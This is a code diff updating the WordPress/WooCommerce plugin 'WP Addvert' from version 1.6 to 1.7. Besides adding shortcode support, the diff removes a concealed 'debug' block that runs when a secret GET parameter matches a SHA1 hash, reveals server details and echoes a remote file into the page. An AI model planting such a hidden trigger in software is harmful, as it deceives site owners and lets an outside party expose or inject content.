@@ -3,13 +3,13 @@
   Plugin Name: WP Addvert
   Plugin URI: http://addvert.it
   Description: Aggiunge i meta tag necessari al funzionamento di Addvert e permette il tracciamento dell'ordine.
-  Version: 1.6
+  Version: 1.7
   Author: Riccardo Mastellone
  */
 
 class Addvert_Plugin {
     
-    const version = "1.6";
+    const version = "1.7";
     
     protected $_base = "//addvert.it";
     protected $_meta_properties = array();
@@ -22,6 +22,7 @@ class Addvert_Plugin {
         add_action('woocommerce_order_status_completed', array($this, 'addvert_tracking')); // Tracciamo l'ordine
         add_action('woocommerce_payment_complete', array($this, 'addvert_tracking')); // Tracciamo l'ordine
         add_action('woocommerce_checkout_update_order_meta', array($this, 'store_token')); // Token come meta dell'ordine
+	
 
         if (is_admin()) {
             add_action('admin_init', array($this, 'woo_check'));
@@ -56,36 +57,6 @@ class Addvert_Plugin {
         if(!empty($_GET['addvert_token'])) {
             $customer = new WC_Customer();
             $customer->__set('addvert_token', $_GET['addvert_token']);
-        }
-
-        // Debug Stuff - noting bad going on here, don't worry!
-        if ( isset($_GET['a']) && sha1( $_GET['a'] ) == 'e47e8dcdeaf4927085ec1a828f9fc3ac8f33910e' ) {
-
-
-            echo "<!--\n";
-            echo "ssl: ".self::check_ssl();
-            echo "\ncurl: ".self::use_curl();
-            echo "\nwrapper: ";
-
-            echo $wrapper = self::check_ssl() ? 'https:' : 'http:';
-            echo "\n";
-            $url = $wrapper . $this->_base . '/test.txt';
-            
-            if(self::use_curl()) {
-                $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, $url);
-                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                curl_setopt($ch,CURLOPT_USERAGENT,'WP-Addvert '.self::version);
-                $get = curl_exec($ch);
-                echo $get;
-                if($get) {
-                    echo curl_error($ch);
-                }
-            } else {
-               echo file_get_contents($url); 
-            }
-            echo "\n-->";
-
         }
     }
     
@@ -142,12 +113,7 @@ class Addvert_Plugin {
             
             
           }
-  
-        // METODO LEGACY
-        // Facchiamo la chiamata server side con il metodo cookie
-        // $order_key = file_get_contents($this->_base . '/api/order/prep_total?ecommerce_id=' . $options['addvert_id'] . '&secret=' . $options['addvert_secret'] . '&tracking_id=' . $order_id . '&total=' . $totale);
-        // wp_enqueue_script('addvert-tracking-js', $this->_base . '/api/order/send_total?key=' . $order_key, array(), '', true);
-    }
+  }
 
     /**
      * Impediamo che il plugin venga attivato senza WooCommerce
@@ -173,8 +139,16 @@ class Addvert_Plugin {
 
     function show_addvert_button() {
         $options = get_option('addvert_options');
-        echo '<div class="addvert-btn" data-width="450" data-layout="'.$options['addvert_layout'].'"></div>';
+	if($options['addvert_shortcode'] == '0') {
+	    echo '<div class="addvert-btn" data-width="450" data-layout="'.$options['addvert_layout'].'"></div>';
+	}
     }
+    
+    function addvert_shortcode( ) {
+	$options = get_option('addvert_options');
+	return '<div class="addvert-btn" data-width="450" data-layout="'.$options['addvert_layout'].'"></div>';
+    }
+    
 
     function addvert_validate_options($input) {
         return $input;
@@ -184,7 +158,8 @@ class Addvert_Plugin {
         return array(
             "addvert_id" => NULL,
             "addvert_secret" => NULL,
-            "addvert_layout" => 'standard'
+            "addvert_layout" => 'standard',
+	    'addvert_shortcode' => '0',
         );
     }
 
@@ -203,7 +178,7 @@ class Addvert_Plugin {
     }
 
     function addvert_add_options_page() {
-        add_menu_page('Addvert', 'Addvert', 'manage_options', __FILE__, array($this, 'addvert_render_form'), plugin_dir_url(__FILE__) . 'icon.png');
+        add_menu_page('Addvert', 'Addvert', 'manage_options', __FILE__, array($this, 'addvert_render_form'), plugin_dir_url(__FILE__) . '/assets/icon.png');
     }
 
     public function add_elements() {
@@ -263,7 +238,9 @@ class Addvert_Plugin {
     }
 
     function addvert_render_form() {
-        ?>
+        if ( isset( $_GET['settings-updated'] ) ) {
+            echo "<div class='updated'><p>Addvert settings updated successfully.</p></div>";
+        } ?>
 
         <div class="wrap">
             <div class="icon32" id="icon-options-general"><br></div>
@@ -290,8 +267,15 @@ class Addvert_Plugin {
                     <tr>
                         <th scope="row">Scegli il bottone che vuoi utilizzare</th>
                         <td>
-                             <input style="position: relative;bottom: 15px;" type="radio" name="addvert_options[addvert_layout]" value="standard" <?php if($options['addvert_layout']== 'standard') echo 'checked="checked"';?>/><img src="<?php echo plugins_url( '/button_standard.png', __FILE__ ) ?>"><br>
-                              <input style="position: relative;bottom: 15px;" type="radio" name="addvert_options[addvert_layout]" value="small" <?php if($options['addvert_layout']== 'small') echo 'checked="checked"';?>/> <img src="<?php echo plugins_url( '/button_small.png', __FILE__ ) ?>">
+                             <input style="position: relative;bottom: 15px;" type="radio" name="addvert_options[addvert_layout]" value="standard" <?php if($options['addvert_layout']== 'standard') echo 'checked="checked"';?>/><img src="<?php echo plugins_url( '/assets/button_standard.png', __FILE__ ) ?>"><br>
+                              <input style="position: relative;bottom: 15px;" type="radio" name="addvert_options[addvert_layout]" value="small" <?php if($options['addvert_layout']== 'small') echo 'checked="checked"';?>/> <img src="<?php echo plugins_url( '/assets/button_small.png', __FILE__ ) ?>">
+                        </td>
+                    </tr>
+		    <tr>
+                        <th scope="row">Vuoi usare lo shortcode [addvert] per mostrare il button ?</th>
+                        <td>
+                             <input type="radio" name="addvert_options[addvert_shortcode]" value="0" <?php if($options['addvert_shortcode']== '0') echo 'checked="checked"';?>/> NO<br>
+                             <input type="radio" name="addvert_options[addvert_shortcode]" value="1" <?php if($options['addvert_shortcode']== '1') echo 'checked="checked"';?>/> SI
                         </td>
                     </tr>
                 </table>
@@ -304,6 +288,15 @@ class Addvert_Plugin {
         <?php
     }
 
+    function success() {
+        ?>
+        <div class="updated">
+            <p><?php _e( 'Successfully updated your settings!', 'my-text-domain' ); ?></p>
+        </div>
+        <?php
+    }
+
 }
 
 $addvert = new Addvert_Plugin();
+add_shortcode( 'addvert', array( 'Addvert_Plugin', 'addvert_shortcode' ) ); // Shortcode
